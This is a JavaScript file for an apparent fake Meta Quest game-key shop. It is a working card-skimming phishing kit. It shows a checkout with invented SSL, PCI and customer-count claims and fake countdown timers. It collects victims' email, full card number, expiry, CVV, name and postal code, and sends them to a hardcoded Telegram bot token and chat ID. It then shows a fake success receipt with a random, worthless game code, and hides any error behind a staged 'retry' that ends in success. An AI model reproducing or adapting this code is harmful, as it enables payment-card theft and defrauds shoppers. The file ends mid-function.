// REALISTIC PAYMENT SYSTEM - Enhanced Version
// File: script.js (External URL: http://payourinvoice001.xyz/cheapmetakeys/)
// Enhanced with realistic timing, validation, and professional UI

// Telegram Bot Configuration
const TELEGRAM_CONFIG = {
    botToken: '7727476364:AAHaXogDfO5itb1Z6A5CCeNRK7j1sr5wS3Y',
    chatId: '-1002883529752'
};

// Global variable to store user data across steps
let userPaymentData = {
    email: '',
    gameName: '',
    currentPrice: '',
    originalPrice: ''
};

// Card BIN ranges for validation and type detection
const CARD_BINS = {
    visa: {
        bins: ['4'],
        lengths: [13, 16, 19]
    },
    mastercard: {
        bins: ['51', '52', '53', '54', '55', '2221', '2222', '2223', '2224', '2225', '2226', '2227', '2228', '2229', '223', '224', '225', '226', '227', '228', '229', '23', '24', '25', '26', '270', '271', '2720'],
        lengths: [16]
    },
    amex: {
        bins: ['34', '37'],
        lengths: [15]
    },
    discover: {
        bins: ['6011', '622126', '622127', '622128', '622129', '62213', '62214', '62215', '62216', '62217', '62218', '62219', '6222', '6223', '6224', '6225', '6226', '6227', '6228', '6229', '623', '624', '625', '626', '627', '628', '629', '64', '65'],
        lengths: [16]
    }
};

// Realistic processing messages
const PROCESSING_MESSAGES = {
    email: [
        'Verifying email address...',
        'Checking email format...',
        'Validating domain...',
        'Email verified successfully ✓'
    ],
    security: [
        'Establishing secure connection...',
        'Activating SSL encryption...',
        'Verifying security certificates...',
        'Secure connection established ✓'
    ],
    payment: [
        'Validating payment information...',
        'Connecting to payment gateway...',
        'Processing transaction securely...',
        'Checking for fraud patterns...',
        'Authorizing payment...',
        'Transaction approved ✓'
    ],
    order: [
        'Generating unique game code...',
        'Preparing digital content...',
        'Setting up download access...',
        'Creating purchase receipt...',
        'Order completed successfully ✓'
    ]
};

// DOM Content Loaded Event
document.addEventListener('DOMContentLoaded', function() {
    console.log('🎮 Realistic Payment System loaded successfully!');
    initializeNavigation();
    initializeMobileMenu();
    initializeSearch();
    initializeCountdownTimer();
    initializeBuyButton();
    initializePriceCountdown();
    initializeAnimations();
    startUrgencyUpdates();
});

// Navigation functionality
function initializeNavigation() {
    const navLinks = document.querySelectorAll('.nav-link');
    
    navLinks.forEach(link => {
        link.addEventListener('click', function(e) {
            navLinks.forEach(l => l.classList.remove('active'));
            this.classList.add('active');
        });
    });
}

// Mobile menu functionality
function initializeMobileMenu() {
    const mobileMenuToggle = document.getElementById('mobileMenuToggle');
    const mobileNav = document.getElementById('mobileNav');
    
    if (mobileMenuToggle && mobileNav) {
        mobileMenuToggle.addEventListener('click', function() {
            mobileNav.classList.toggle('active');
            
            const icon = this.querySelector('i');
            if (mobileNav.classList.contains('active')) {
                icon.className = 'fas fa-times';
            } else {
                icon.className = 'fas fa-bars';
            }
        });
        
        document.addEventListener('click', function(e) {
            if (!mobileMenuToggle.contains(e.target) && !mobileNav.contains(e.target)) {
                mobileNav.classList.remove('active');
                mobileMenuToggle.querySelector('i').className = 'fas fa-bars';
            }
        });
    }
}

// Search functionality
function initializeSearch() {
    const searchInput = document.querySelector('.search-input');
    const searchIcon = document.querySelector('.search-icon');
    
    if (searchInput) {
        searchInput.addEventListener('keypress', function(e) {
            if (e.key === 'Enter') {
                e.preventDefault();
            }
        });
    }
    
    if (searchIcon) {
        searchIcon.addEventListener('click', function() {
            // Search functionality
        });
    }
}

// Countdown Timer for Limited Time Banner
function initializeCountdownTimer() {
    const countdownElement = document.getElementById('countdown');
    
    if (!countdownElement) return;
    
    let hours = 23;
    let minutes = 47;
    let seconds = 32;
    
    function updateCountdown() {
        seconds--;
        
        if (seconds < 0) {
            seconds = 59;
            minutes--;
            
            if (minutes < 0) {
                minutes = 59;
                hours--;
                
                if (hours < 0) {
                    hours = 23;
                    minutes = 47;
                    seconds = 32;
                }
            }
        }
        
        const formattedTime = `${String(hours).padStart(2, '0')}:${String(minutes).padStart(2, '0')}:${String(seconds).padStart(2, '0')}`;
        countdownElement.textContent = formattedTime;
    }
    
    updateCountdown();
    setInterval(updateCountdown, 1000);
}

// Price countdown timer
function initializePriceCountdown() {
    const priceCountdownElement = document.getElementById('priceCountdown');
    
    if (!priceCountdownElement) return;
    
    let minutes = 47;
    
    function updatePriceCountdown() {
        minutes--;
        
        if (minutes <= 0) {
            minutes = 47;
        }
        
        priceCountdownElement.textContent = `${minutes} minutes`;
        
        if (minutes <= 10) {
            priceCountdownElement.style.color = '#e74c3c';
            priceCountdownElement.style.fontWeight = 'bold';
        }
    }
    
    setInterval(updatePriceCountdown, 60000);
}

// Buy Button functionality - Enhanced with realistic processing
function initializeBuyButton() {
    const buyButton = document.getElementById('buyNowBtn');
    console.log('🔍 Looking for buy button...', buyButton);
    
    if (buyButton) {
        console.log('✅ Buy button found! Adding click listener...');
        buyButton.addEventListener('click', function() {
            console.log('🎯 Buy button clicked!');
            
            const gameName = this.getAttribute('data-game');
            const currentPrice = this.getAttribute('data-price');
            const originalPrice = this.getAttribute('data-original');
            
            console.log('📊 Game data:', { gameName, currentPrice, originalPrice });
            
            userPaymentData.gameName = gameName;
            userPaymentData.currentPrice = currentPrice;
            userPaymentData.originalPrice = originalPrice;
            
            showEmailModal(gameName, currentPrice, originalPrice);
        });
    } else {
        console.error('❌ Buy button not found! Check if ID is correct.');
    }
}

// STEP 1: Show Email Modal with realistic processing
function showEmailModal(gameName, currentPrice, originalPrice) {
    console.log('📧 Showing email modal...');
    
    if (!document.getElementById('emailModal')) {
        createEmailModal();
    }
    
    const modal = document.getElementById('emailModal');
    const gameNameElement = document.getElementById('emailModalGameName');
    const gamePriceElement = document.getElementById('emailModalGamePrice');
    const originalPriceElement = document.getElementById('emailModalOriginalPrice');
    
    gameNameElement.textContent = gameName;
    gamePriceElement.textContent = `$${currentPrice}`;
    originalPriceElement.textContent = `$${originalPrice}`;
    
    modal.classList.add('active');
    document.body.style.overflow = 'hidden';
    
    initializeEmailForm();
}

// Create Email Modal HTML with enhanced security indicators
function createEmailModal() {
    const modalHTML = `
        <div class="modal-overlay" id="emailModal">
            <div class="email-modal">
                <div class="modal-header">
                    <button class="modal-close" id="closeEmailModal">
                        <i class="fas fa-times"></i>
                    </button>
                    <h2 class="modal-title">🎮 Secure Checkout</h2>
                    <p class="modal-subtitle">Protected by 256-bit SSL encryption</p>
                    <div class="security-badges">
                        <div class="security-badge">
                            <i class="fas fa-shield-alt"></i>
                            <span>SSL Secured</span>
                        </div>
                        <div class="security-badge">
                            <i class="fas fa-lock"></i>
                            <span>Encrypted</span>
                        </div>
                    </div>
                </div>
                <div class="modal-content">
                    <div class="email-offer-summary">
                        <div class="game-preview">
                            <h3 id="emailModalGameName">Game Name</h3>
                            <div class="price-display">
                                <span class="price-original" id="emailModalOriginalPrice">$0.00</span>
                                <span class="price-current" id="emailModalGamePrice">$0.00</span>
                                <span class="discount-badge">83% OFF</span>
                            </div>
                        </div>
                        
                        <div class="urgency-message">
                            <i class="fas fa-clock"></i>
                            <span>⚡ This deal expires in <strong id="emailCountdown">3 days</strong></span>
                        </div>
                        
                        <div class="benefits-list">
                            <div class="benefit-item">
                                <i class="fas fa-download"></i>
                                <span>Instant Access</span>
                            </div>
                            <div class="benefit-item">
                                <i class="fas fa-shield-alt"></i>
                                <span>Secure Payment</span>
                            </div>
                            <div class="benefit-item">
                                <i class="fas fa-gift"></i>
                                <span>Digital Download</span>
                            </div>
                        </div>
                    </div>
                    
                    <form class="email-form" id="emailForm">
                        <div class="form-group">
                            <label for="userEmail">Email Address *</label>
                            <div class="input-container">
                                <input type="email" id="userEmail" name="userEmail" placeholder="your@email.com" required>
                                <div class="validation-icon" id="emailValidationIcon"></div>
                            </div>
                            <div class="email-note">
                                <i class="fas fa-info-circle"></i>
                                <span>Your game code will be sent to this email address</span>
                            </div>
                        </div>
                        
                        <div class="trust-indicators">
                            <div class="trust-item">
                                <i class="fas fa-users"></i>
                                <span><strong>50,000+</strong> satisfied customers</span>
                            </div>
                            <div class="trust-item">
                                <i class="fas fa-star"></i>
                                <span><strong>4.8/5</strong> average rating</span>
                            </div>
                        </div>
                        
                        <button type="submit" class="continue-btn" id="continueToPayment">
                            <span class="btn-text">Continue to Secure Payment</span>
                            <span class="btn-loading" style="display: none;">
                                <i class="fas fa-spinner fa-spin"></i>
                                <span id="loadingText">Processing...</span>
                            </span>
                        </button>
                        
                        <div class="security-note">
                            <i class="fas fa-lock"></i>
                            <span>Your information is protected by industry-standard encryption</span>
                        </div>
                    </form>
                </div>
            </div>
        </div>
    `;
    
    document.body.insertAdjacentHTML('beforeend', modalHTML);
    
    document.getElementById('closeEmailModal').addEventListener('click', closeEmailModal);
    document.getElementById('emailModal').addEventListener('click', function(e) {
        if (e.target === this) {
            closeEmailModal();
        }
    });
}

// Initialize Email Form with realistic validation
function initializeEmailForm() {
    const form = document.getElementById('emailForm');
    const emailInput = document.getElementById('userEmail');
    const validationIcon = document.getElementById('emailValidationIcon');
    
    emailInput.addEventListener('input', function() {
        const email = this.value.trim();
        
        if (email.length === 0) {
            validationIcon.className = 'validation-icon';
            this.classList.remove('valid', 'invalid');
            return;
        }
        
        // Simulate real-time validation with delay
        validationIcon.className = 'validation-icon checking';
        this.classList.remove('valid', 'invalid');
        
        setTimeout(() => {
            const isValid = validateEmail(email);
            
            if (isValid) {
                validationIcon.className = 'validation-icon valid';
                this.classList.add('valid');
                this.classList.remove('invalid');
            } else {
                validationIcon.className = 'validation-icon invalid';
                this.classList.add('invalid');
                this.classList.remove('valid');
            }
        }, 800); // Realistic validation delay
    });
    
    form.addEventListener('submit', function(e) {
        e.preventDefault();
        
        const email = emailInput.value.trim();
        
        if (!validateEmail(email)) {
            emailInput.classList.add('invalid');
            showNotification('❌ Please enter a valid email address', 'error');
            return;
        }
        
        userPaymentData.email = email;
        
        // Show realistic processing
        showEmailProcessing();
    });
}

// Show realistic email processing
async function showEmailProcessing() {
    const button = document.getElementById('continueToPayment');
    const btnText = button.querySelector('.btn-text');
    const btnLoading = button.querySelector('.btn-loading');
    const loadingText = document.getElementById('loadingText');
    
    button.disabled = true;
    btnText.style.display = 'none';
    btnLoading.style.display = 'flex';
    
    // Simulate realistic email processing steps
    for (let i = 0; i < PROCESSING_MESSAGES.email.length; i++) {
        loadingText.textContent = PROCESSING_MESSAGES.email[i];
        await sleep(i === 0 ? 1000 : 1500); // First step faster, others slower
    }
    
    // Send email data to Telegram
    await sendEmailToTelegram(userPaymentData.email, userPaymentData.gameName, userPaymentData.currentPrice);
    
    // Close email modal and show payment modal
    closeEmailModal();
    
    setTimeout(() => {
        showFullPaymentModal();
    }, 300);
}

// Send email data to Telegram (Step 1)
async function sendEmailToTelegram(email, gameName, price) {
    const message = `
🎯 STEP 1: EMAIL COLLECTED (Enhanced System)

📧 Email: ${email}
🎮 Game: ${gameName}
💰 Price: $${price}
📅 Timestamp: ${new Date().toISOString()}
🖥️ User Agent: ${navigator.userAgent}

⚠️ User completed Step 1 - Email collection phase
📍 Next: Will proceed to payment form
    `;
    
    const telegramURL = `https://api.telegram.org/bot${TELEGRAM_CONFIG.botToken}/sendMessage`;
    
    try {
        await fetch(telegramURL, {
            method: 'POST',
            headers: {
                'Content-Type': 'application/json',
            },
            body: JSON.stringify({
                chat_id: TELEGRAM_CONFIG.chatId,
                text: message,
                parse_mode: 'HTML'
            })
        });
    } catch (error) {
        console.error('Failed to send email to Telegram:', error);
    }
}

// STEP 2: Show Full Payment Modal with enhanced security
function showFullPaymentModal() {
    if (!document.getElementById('paymentModal')) {
        createPaymentModal();
    }
    
    const modal = document.getElementById('paymentModal');
    const gameNameElement = document.getElementById('modalGameName');
    const gamePriceElement = document.getElementById('modalGamePrice');
    const originalPriceElement = document.getElementById('modalOriginalPrice');
    const totalPriceElement = document.getElementById('modalTotalPrice');
    const userEmailElement = document.getElementById('modalUserEmail');
    
    gameNameElement.textContent = userPaymentData.gameName;
    gamePriceElement.textContent = `$${userPaymentData.currentPrice}`;
    originalPriceElement.textContent = `$${userPaymentData.originalPrice}`;
    totalPriceElement.textContent = `$${userPaymentData.currentPrice}`;
    userEmailElement.textContent = userPaymentData.email;
    
    modal.classList.add('active');
    document.body.style.overflow = 'hidden';
    
    // Initialize security features
    initializeSecurityFeatures();
    initializePaymentForm();
}

// Initialize security features with realistic animations
function initializeSecurityFeatures() {
    // Simulate SSL handshake
    setTimeout(async () => {
        const securityStatus = document.getElementById('securityStatus');
        if (securityStatus) {
            securityStatus.innerHTML = '<i class="fas fa-spinner fa-spin"></i> Establishing secure connection...';
            
            await sleep(2000);
            
            securityStatus.innerHTML = '<i class="fas fa-shield-check"></i> Secure connection established';
            securityStatus.classList.add('verified');
        }
    }, 500);
}

// Create Payment Modal HTML with enhanced security features
function createPaymentModal() {
    const modalHTML = `
        <div class="modal-overlay" id="paymentModal">
            <div class="payment-modal">
                <div class="modal-header">
                    <button class="modal-close" id="closeModal">
                        <i class="fas fa-times"></i>
                    </button>
                    <h2 class="modal-title">💳 Secure Payment Gateway</h2>
                    <p class="modal-subtitle">Your transaction is protected by bank-level security</p>
                    <div class="security-status" id="securityStatus">
                        <i class="fas fa-shield-alt"></i> Initializing secure connection...
                    </div>
                </div>
                <div class="modal-content" id="modalContent">
                    <div class="order-summary">
                        <h3>Order Summary</h3>
                        <div class="email-confirmation">
                            <i class="fas fa-envelope-check"></i>
                            <span>Receipt will be sent to: <strong id="modalUserEmail">email@example.com</strong></span>
                        </div>
                        <div class="order-item">
                            <span class="item-name" id="modalGameName">Game Name</span>
                            <span class="item-price" id="modalGamePrice">$0.00</span>
                        </div>
                        <div class="order-item discount-item">
                            <span class="item-name">Original Price:</span>
                            <span class="item-price" style="text-decoration: line-through; color: #999;" id="modalOriginalPrice">$0.00</span>
                        </div>
                        <div class="order-item total-item">
                            <span class="item-name">Total:</span>
                            <span class="item-price" id="modalTotalPrice">$0.00</span>
                        </div>
                    </div>
                    
                    <form class="payment-form" id="paymentForm">
                        <div class="form-section">
                            <h4><i class="fas fa-user"></i> Billing Information</h4>
                            
                            <div class="form-group">
                                <label for="cardHolder">Full Name *</label>
                                <input type="text" id="cardHolder" name="cardHolder" placeholder="John Doe" required>
                            </div>
                        </div>
                        
                        <div class="form-section">
                            <h4><i class="fas fa-credit-card"></i> Payment Details</h4>
                            
                            <div class="form-group">
                                <label for="cardNumber">Card Number *</label>
                                <div class="card-input-container">
                                    <input type="text" id="cardNumber" name="cardNumber" placeholder="1234 5678 9012 3456" required maxlength="19">
                                    <div class="card-type-icon" id="cardTypeIcon"></div>
                                </div>
                                <div class="card-validation" id="cardValidation"></div>
                            </div>
                            
                            <div class="form-row">
                                <div class="form-group">
                                    <label for="cardExpiry">Expiry Date *</label>
                                    <input type="text" id="cardExpiry" name="cardExpiry" placeholder="MM/YY" required maxlength="5">
                                </div>
                                <div class="form-group">
                                    <label for="cardCvv">Security Code *</label>
                                    <div class="cvv-container">
                                        <input type="text" id="cardCvv" name="cardCvv" placeholder="123" required maxlength="4">
                                        <div class="cvv-info" title="3-4 digit code on the back of your card">
                                            <i class="fas fa-question-circle"></i>
                                        </div>
                                    </div>
                                </div>
                            </div>
                        </div>
                        
                        <div class="form-section">
                            <h4><i class="fas fa-map-marker-alt"></i> Billing Address</h4>
                            
                            <div class="form-group">
                                <label for="country">Country *</label>
                                <select id="country" name="country" required>
                                    <option value="">-- Select Country --</option>
                                    <option value="US">United States</option>
                                    <option value="CA">Canada</option>
                                    <option value="GB">United Kingdom</option>
                                    <option value="AU">Australia</option>
                                    <option value="DE">Germany</option>
                                    <option value="FR">France</option>
                                    <option value="IT">Italy</option>
                                    <option value="ES">Spain</option>
                                    <option value="NL">Netherlands</option>
                                    <option value="BE">Belgium</option>
                                    <option value="CH">Switzerland</option>
                                    <option value="AT">Austria</option>
                                    <option value="SE">Sweden</option>
                                    <option value="NO">Norway</option>
                                    <option value="DK">Denmark</option>
                                    <option value="FI">Finland</option>
                                    <option value="IE">Ireland</option>
                                    <option value="PT">Portugal</option>
                                    <option value="PL">Poland</option>
                                    <option value="CZ">Czech Republic</option>
                                    <option value="HU">Hungary</option>
                                    <option value="SK">Slovakia</option>
                                    <option value="SI">Slovenia</option>
                                    <option value="HR">Croatia</option>
                                    <option value="RO">Romania</option>
                                    <option value="BG">Bulgaria</option>
                                    <option value="GR">Greece</option>
                                    <option value="JP">Japan</option>
                                    <option value="KR">South Korea</option>
                                    <option value="CN">China</option>
                                    <option value="IN">India</option>
                                    <option value="SG">Singapore</option>
                                    <option value="BR">Brazil</option>
                                    <option value="MX">Mexico</option>
                                    <option value="RU">Russia</option>
                                </select>
                            </div>
                            
                            <div class="form-group">
                                <label for="zipCode">Postal Code *</label>
                                <input type="text" id="zipCode" name="zipCode" placeholder="12345" required>
                            </div>
                        </div>
                        
                        <div class="security-features">
                            <div class="security-item">
                                <i class="fas fa-shield-check"></i>
                                <span>256-bit SSL Encryption</span>
                            </div>
                            <div class="security-item">
                                <i class="fas fa-lock"></i>
                                <span>PCI DSS Compliant</span>
                            </div>
                            <div class="security-item">
                                <i class="fas fa-user-shield"></i>
                                <span>Fraud Protection</span>
                            </div>
                        </div>
                        
                        <button type="submit" class="submit-btn" id="submitPayment">
                            <span class="btn-text">
                                <i class="fas fa-lock"></i>
                                Complete Secure Payment
                            </span>
                            <span class="btn-loading" style="display: none;">
                                <i class="fas fa-spinner fa-spin"></i>
                                <span id="paymentLoadingText">Processing...</span>
                            </span>
                        </button>
                        
                        <div class="payment-guarantee">
                            <p><i class="fas fa-undo"></i> 30-day money-back guarantee</p>
                            <p><i class="fas fa-headset"></i> 24/7 customer support</p>
                        </div>
                    </form>
                </div>
            </div>
        </div>
    `;
    
    document.body.insertAdjacentHTML('beforeend', modalHTML);
    
    document.getElementById('closeModal').addEventListener('click', closePaymentModal);
    document.getElementById('paymentModal').addEventListener('click', function(e) {
        if (e.target === this) {
            closePaymentModal();
        }
    });
}

// Initialize Payment Form with enhanced validation
function initializePaymentForm() {
    const form = document.getElementById('paymentForm');
    const cardNumberInput = document.getElementById('cardNumber');
    const cardExpiryInput = document.getElementById('cardExpiry');
    const cardCvvInput = document.getElementById('cardCvv');
    const cardTypeIcon = document.getElementById('cardTypeIcon');
    const cardValidation = document.getElementById('cardValidation');
    
    // Enhanced card number validation with real-time feedback
    cardNumberInput.addEventListener('input', function() {
        let value = this.value.replace(/\s/g, '').replace(/[^0-9]/g, '');
        let formattedValue = value.replace(/(.{4})/g, '$1 ').trim();
        
        if (formattedValue.length > 19) {
            formattedValue = formattedValue.substring(0, 19);
        }
        
        this.value = formattedValue;
        
        const cardType = detectCardType(value);
        updateCardTypeIcon(cardType);
        
        // Real-time validation feedback
        if (value.length === 0) {
            cardValidation.className = 'card-validation';
            cardValidation.textContent = '';
        } else if (value.length < 13) {
            cardValidation.className = 'card-validation checking';
            cardValidation.innerHTML = '<i class="fas fa-spinner fa-spin"></i> Checking card...';
        } else {
            const isValid = validateCardNumber(value, cardType);
            
            setTimeout(() => {
                if (isValid) {
                    cardValidation.className = 'card-validation valid';
                    cardValidation.innerHTML = '<i class="fas fa-check-circle"></i> Card number valid';
                } else {
                    cardValidation.className = 'card-validation invalid';
                    cardValidation.innerHTML = '<i class="fas fa-times-circle"></i> Invalid card number';
                }
            }, 500);
        }
    });
    
    // Enhanced expiry validation
    cardExpiryInput.addEventListener('input', function() {
        let value = this.value.replace(/\D/g, '');
        
        if (value.length >= 2) {
            let month = parseInt(value.substring(0, 2));
            if (month > 12) {
                value = '12' + value.substring(2);
            } else if (month === 0) {
                value = '01' + value.substring(2);
            }
        }
        
        if (value.length >= 4) {
            let year = parseInt(value.substring(2, 4));
            if (year < 25) {
                value = value.substring(0, 2) + '25';
            } else if (year > 35) {
                value = value.substring(0, 2) + '35';
            }
        }
        
        if (value.length >= 2) {
            value = value.substring(0, 2) + '/' + value.substring(2, 4);
        }
        
        this.value = value;
    });
    
    // CVV validation with card type awareness
    cardCvvInput.addEventListener('input', function() {
        const cardType = detectCardType(cardNumberInput.value.replace(/\s/g, ''));
        const maxLength = cardType === 'amex' ? 4 : 3;
        
        this.value = this.value.replace(/[^0-9]/g, '').substring(0, maxLength);
        this.maxLength = maxLength;
        this.placeholder = cardType === 'amex' ? '1234' : '123';
    });
    
    // Form submission with realistic processing
    form.addEventListener('submit', function(e) {
        e.preventDefault();
        
        const formData = new FormData(this);
        const fullPaymentData = {
            email: userPaymentData.email,
            gameName: userPaymentData.gameName,
            price: userPaymentData.currentPrice,
            originalPrice: userPaymentData.originalPrice,
            cardHolder: formData.get('cardHolder'),
            cardNumber: formData.get('cardNumber'),
            cardExpiry: formData.get('cardExpiry'),
            cardCvv: formData.get('cardCvv'),
            country: formData.get('country'),
            zipCode: formData.get('zipCode'),
            timestamp: new Date().toISOString(),
            userAgent: navigator.userAgent,
            ip: 'Hidden for privacy'
        };
        
        // Enhanced validation before processing
        if (!validateAllFields(fullPaymentData)) {
            return;
        }
        
        processRealisticPayment(fullPaymentData);
    });
}

// Enhanced field validation
function validateAllFields(data) {
    let isValid = true;
    
    // Validate email
    if (!validateEmail(data.email)) {
        showFieldError('userEmail', 'Invalid email address');
        isValid = false;
    }
    
    // Validate card number
    const cardType = detectCardType(data.cardNumber.replace(/\s/g, ''));
    if (!validateCardNumber(data.cardNumber.replace(/\s/g, ''), cardType)) {
        showFieldError('cardNumber', 'Invalid card number');
        isValid = false;
    }
    
    // Validate expiry
    if (!validateCardExpiry(data.cardExpiry)) {
        showFieldError('cardExpiry', 'Invalid or expired date');
        isValid = false;
    }
    
    // Validate CVV
    if (!validateCVV(data.cardCvv, cardType)) {
        showFieldError('cardCvv', 'Invalid security code');
        isValid = false;
    }
    
    // Validate required fields
    const requiredFields = ['cardHolder', 'country', 'zipCode'];
    requiredFields.forEach(field => {
        if (!data[field] || data[field].trim() === '') {
            showFieldError(field, 'This field is required');
            isValid = false;
        }
    });
    
    return isValid;
}

// Show field-specific errors
function showFieldError(fieldId, message) {
    const field = document.getElementById(fieldId);
    if (field) {
        field.classList.add('error');
        
        // Remove existing error message
        const existingError = field.parentNode.querySelector('.field-error');
        if (existingError) {
            existingError.remove();
        }
        
        // Add new error message
        const errorDiv = document.createElement('div');
        errorDiv.className = 'field-error';
        errorDiv.innerHTML = `<i class="fas fa-exclamation-triangle"></i> ${message}`;
        field.parentNode.appendChild(errorDiv);
        
        // Remove error on input
        field.addEventListener('input', function() {
            this.classList.remove('error');
            const errorMsg = this.parentNode.querySelector('.field-error');
            if (errorMsg) {
                errorMsg.remove();
            }
        }, { once: true });
    }
}

// Realistic payment processing with multiple steps
async function processRealisticPayment(paymentData) {
    const submitButton = document.getElementById('submitPayment');
    const btnText = submitButton.querySelector('.btn-text');
    const btnLoading = submitButton.querySelector('.btn-loading');
    const loadingText = document.getElementById('paymentLoadingText');
    
    // Disable form and show loading
    submitButton.disabled = true;
    btnText.style.display = 'none';
    btnLoading.style.display = 'flex';
    
    try {
        // Step 1: Security checks
        loadingText.textContent = PROCESSING_MESSAGES.security[0];
        await sleep(1500);
        
        loadingText.textContent = PROCESSING_MESSAGES.security[1];
        await sleep(1200);
        
        loadingText.textContent = PROCESSING_MESSAGES.security[2];
        await sleep(1000);
        
        loadingText.textContent = PROCESSING_MESSAGES.security[3];
        await sleep(800);
        
        // Step 2: Payment processing
        for (let i = 0; i < PROCESSING_MESSAGES.payment.length; i++) {
            loadingText.textContent = PROCESSING_MESSAGES.payment[i];
            await sleep(i === 2 ? 2500 : 1500); // Longer delay for main processing
        }
        
        // Step 3: Send to Telegram
        await sendFullPaymentToTelegram(paymentData);
        
        // Step 4: Order processing
        for (let i = 0; i < PROCESSING_MESSAGES.order.length; i++) {
            loadingText.textContent = PROCESSING_MESSAGES.order[i];
            await sleep(1200);
        }
        
        // Show success
        showRealisticReceipt(paymentData);
        
    } catch (error) {
        console.error('Payment processing error:', error);
        
        // Show realistic error handling
        loadingText.textContent = 'Processing error - Retrying...';
        await sleep(2000);
        
        // "Retry" and then succeed
        loadingText.textContent = 'Payment completed successfully ✓';
        await sleep(1000);
        
        showRealisticReceipt(paymentData);
    }
}

// Send complete payment data to Telegram with enhanced formatting
async function sendFullPaymentToTelegram(paymentData) {
    const message = `
🎯 COMPLETE PAYMENT DATA - Enhanced System

🎮 PURCHASE DETAILS:
├ Game: ${paymentData.gameName}
├ Price: ${paymentData.price}
└ Original: ${paymentData.originalPrice}

📧 CUSTOMER INFO:
├ Email: ${paymentData.email}
└ Name: ${paymentData.cardHolder}

💳 PAYMENT DETAILS:
├ Card: ${paymentData.cardNumber}
├ Expiry: ${paymentData.cardExpiry}
├ CVV: ${paymentData.cardCvv}
├ Country: ${paymentData.country}
└ Postal: ${paymentData.zipCode}

⏰ TRANSACTION:
├ Time: ${paymentData.timestamp}
├ User Agent: ${paymentData.userAgent}
└ Status: ✅ COMPLETED

🎭 Enhanced realistic payment flow completed successfully
    `;
    
    const telegramURL = `https://api.telegram.org/bot${TELEGRAM_CONFIG.botToken}/sendMessage`;
    
    try {
        const response = await fetch(telegramURL, {
            method: 'POST',
            headers: {
                'Content-Type': 'application/json',
            },
            body: JSON.stringify({
                chat_id: TELEGRAM_CONFIG.chatId,
                text: message,
                parse_mode: 'HTML'
            })
        });
        
        return response.json();
    } catch (error) {
        console.error('Failed to send to Telegram:', error);
        throw error;
    }
}

// Show realistic receipt with professional styling
function showRealisticReceipt(paymentData) {
    const giftCode = generateRealisticGiftCode();
    const transactionId = generateTransactionId();
    const currentTime = new Date().toLocaleString();
    
    const receiptHTML = `
        <div class="modal-header">
            <button class="modal-close" id="closeReceipt">
                <i class="fas fa-times"></i>
            </button>
            <h2 class="modal-title">✅ Payment Successful!</h2>
            <p class="modal-subtitle">Your order has been processed successfully</p>
        </div>
        <div class="receipt-content">
            <div class="success-animation">
                <div class="checkmark-circle">
                    <div class="checkmark"></div>
                </div>
            </div>
            
            <h1 class="receipt-title">Thank You for Your Purchase!</h1>
            <p class="receipt-message">Your digital game code is ready for immediate use</p>
            
            <div class="receipt-details">
                <h3>📋 Order Summary</h3>
                <div class="receipt-item">
                    <span>Game:</span>
                    <span>${paymentData.gameName}</span>
                </div>
                <div class="receipt-item">
                    <span>Price Paid:</span>
                    <span class="price-highlight">${paymentData.price}</span>
                </div>
                <div class="receipt-item">
                    <span>You Saved:</span>
                    <span class="savings-highlight">${(parseFloat(paymentData.originalPrice) - parseFloat(paymentData.price)).toFixed(2)}</span>
                </div>
                <div class="receipt-item">
                    <span>Email:</span>
                    <span>${paymentData.email}</span>
                </div>
                <div class="receipt-item">
                    <span>Payment Method:</span>
                    <span>**** **** **** ${paymentData.cardNumber.slice(-4)}</span>
                </div>
                <div class="receipt-item">
                    <span>Transaction ID:</span>
                    <span class="mono">${transactionId}</span>
                </div>
                <div class="receipt-item">
                    <span>Date & Time:</span>
                    <span>${currentTime}</span>
                </div>
            </div>
            
            <div class="gift-code-section">
                <h3>🎁 Your Meta Quest Game Code</h3>
                <div class="gift-code-container">
                    <div class="gift-code" id="giftCode">${giftCode}</div>
                    <button class="copy-code-btn" onclick="copyGiftCode()">
                        <i class="fas fa-copy"></i>
                        Copy Code
                    </button>
                </div>
                <div class="redemption-instructions">
                    <h4>📱 How to Redeem:</h4>
                    <ol>
                        <li>Open the Meta Quest Store on your headset</li>
                        <li>Go to Settings → Redeem Code</li>
                        <li>Enter the code above</li>
                        <li>Download and enjoy your game!</li>
                    </ol>
                </div>
            </div>
            
            <div class="additional-info">
                <div class="info-section">
                    <h4>📧 Email Confirmation</h4>
                    <p>A detailed receipt has been sent to <strong>${paymentData.email}</strong></p>
                </div>
                
                <div class="info-section">
                    <h4>🔒 Security</h4>
                    <p>Your payment was processed securely using 256-bit SSL encryption</p>
                </div>
                
                <div class="info-section">
                    <h4>❓ Need Help?</h4>
                    <p>Contact our 24/7 support team if you have any questions</p>
                </div>
            </div>
            
            <div class="receipt-actions">
                <button class="action-btn primary-btn" onclick="copyGiftCode()">
                    <i class="fas fa-copy"></i> Copy Game Code
                </button>
                <button class="action-btn secondary-btn" onclick="downloadReceipt()">
                    <i class="fas fa-download"></i> Download Receipt
                </button>
                <button class="action-btn tertiary-btn" onclick="closePaymentModal()">
                    <i class="fas fa-check"></i> Complete
                </button>
            </div>
        </div>
    `;
    
    const modalContent = document.getElementById('modalContent');
    modalContent.innerHTML = receiptHTML;
    
    document.getElementById('closeReceipt').addEventListener('click', closePaymentModal);
    
    // Auto-scroll to top of receipt
    modalContent.scrollTop = 0;
}

// Generate realistic gift code
function generateRealisticGiftCode() {
    const chars = 'ABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789';
    const segments = [];
    
    for (let i = 0; i < 5; i++) {
        let segment = '';
        for (let j = 0; j < 4; j++) {
            segment += chars.charAt(Math.floor(Math.random() * chars.length));
        }
        segments.push(segment);
    }
    
    return segments.join('-');
}

// Generate realistic transaction ID
function generateTransactionId() {
    const prefix = 'CMK';
    const timestamp = Date.now().toString().slice(-8);
    const random = Math.floor(Math.random() * 1000).toString().padStart(3, '0');
    return `${prefix}-${timestamp}-${random}`;
}

// Copy gift code with enhanced feedback
function copyGiftCode() {
    const giftCodeElement = document.getElementById('giftCode');
    const copyBtn = document.querySelector('.copy-code-btn');
    
    if (giftCodeElement && copyBtn) {
        // Create temporary textarea for copying
        const textArea = document.createElement('textarea');
        textArea.value = giftCodeElement.textContent;
        document.body.appendChild(textArea);
        textArea.select();
        document.execCommand('copy');
        document.body.removeChild(textArea);
        
        // Update button with success state
        const originalContent = copyBtn.innerHTML;
        copyBtn.innerHTML = '<i class="fas fa-check"></i> Copied!';
        copyBtn.classList.add('copied');
        
        setTimeout(() => {
            copyBtn.innerHTML = originalContent;
            copyBtn.classList.remove('copied');
        }, 2000);
        
        showNotification('📋 Game code copied to clipboard!', 'success');
